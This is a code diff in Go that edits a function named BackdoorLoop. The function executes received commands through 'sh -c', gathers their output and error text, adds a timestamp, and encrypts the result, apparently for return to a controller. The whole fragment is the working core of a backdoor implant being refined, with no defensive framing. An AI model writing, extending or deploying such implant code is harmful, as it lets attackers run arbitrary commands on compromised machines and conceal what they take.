@@ -127,17 +127,21 @@ func BackdoorLoop() {
 
 			run := exec.Command("sh", "-c", command)
 			output, err := run.CombinedOutput()
+			cleanOutput := strings.TrimSpace(string(output))
 			if err != nil {
 				fmt.Println("Error executing command:", err)
+				// Keep the error message but keep it clean
+				cleanOutput = fmt.Sprintf("Error: %s\n%s", err.Error(), cleanOutput)
 			}
-			outputs = append(outputs, string(output))
+			outputs = append(outputs, cleanOutput)
 		}
 
 		SetLastCommandTime(timestamp)
 
 		// encrypt
 		outputCombined := strings.Join(outputs, "\n")
-		outputEncrypted, err := encryption.EncryptString(outputCombined, key)
+		outputWithTimestamp := fmt.Sprintf("%d|%s", timestamp, outputCombined)
+		outputEncrypted, err := encryption.EncryptString(outputWithTimestamp, key)
 		if err != nil {
 			fmt.Println("Error encrypting output:", err)
 			return
